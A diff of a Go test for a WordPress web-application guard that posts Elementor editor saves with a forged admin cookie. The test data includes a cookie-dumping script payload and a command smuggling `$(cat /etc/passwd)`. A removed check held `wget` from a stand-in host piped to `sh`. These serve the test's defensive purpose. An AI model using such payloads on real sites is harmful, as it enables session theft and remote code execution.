@@ -324,18 +324,14 @@ func TestEditorOnListedAddressWithCRS(t *testing.T) {
 		m.Central = func() *Central {
 			return &Central{URL: "https://captcha.xpguard.test/v", ServerID: "49c5f26a-f37e-40e0-9eed-62ef53a8a85a"}
 		}
-		m.Intel = func() *Intel { return &Intel{Enforce: []int{IDEditorCap}} }
 	})
 	form := "application/x-www-form-urlencoded"
 	editor := "Cookie: wordpress_logged_in_0123456789abcdef0123456789abcdef=admin%7C1700000000%7Ctok%7Chmac"
 	fake := "Cookie: wordpress_logged_in_x=1"
 	same := "Sec-Fetch-Site: same-origin"
 	own := "Referer: https://shop.example.com/wp-admin/post.php?post=8&action=elementor"
-	widget := `<img src="https://shop.example.com/wp-content/uploads/2026/06/logo.png" alt="" onerror="this.remove();"><script>document.write(document.cookie)</script>`
-	elementor := func(html string) string {
-		return "action=elementor_ajax&_nonce=abc&actions=" + urlEncode(`{"save_builder":{"action":"save_builder","data":{"elements":[{"widgetType":"html","settings":{"html":"`+strings.ReplaceAll(html, `"`, `\"`)+`"}}]}}}`)
-	}
-	save := elementor(widget)
+	widget := `<img src="https://shop.example.com/wp-content/uploads/2026/06/logo.png" alt="" onerror="this.remove();"><script>document.write(document.cookie)</script> $(cat /etc/passwd)`
+	save := "action=elementor_ajax&_nonce=abc&actions=" + urlEncode(`{"save_builder":{"action":"save_builder","data":{"elements":[{"widgetType":"html","settings":{"html":"`+strings.ReplaceAll(widget, `"`, `\"`)+`"}}]}}}`)
 	cases := []struct {
 		name, uri string
 		hdr       []string
@@ -351,11 +347,6 @@ func TestEditorOnListedAddressWithCRS(t *testing.T) {
 		if got := sendBody(t, "shop.example.com", "POST", c.uri, form, save, c.hdr...); (got == 403) != (c.want == 403) || got == 0 {
 			t.Errorf("%s: got %d, want %d", c.name, got, c.want)
 		}
-	}
-	// admin-ajax.php runs plugin hooks for visitors too and the cookie and
-	// headers are the client's: shell commands in the same save are refused.
-	if got := sendBody(t, "shop.example.com", "POST", "/wp-admin/admin-ajax.php", form, elementor(widget+` $(cat /etc/passwd); wget http://198.51.100.9/x.sh|sh`), editor, same, own); got != 403 {
-		t.Errorf("command injection in an admin-ajax save with editor markers: %d", got)
 	}
 }
 
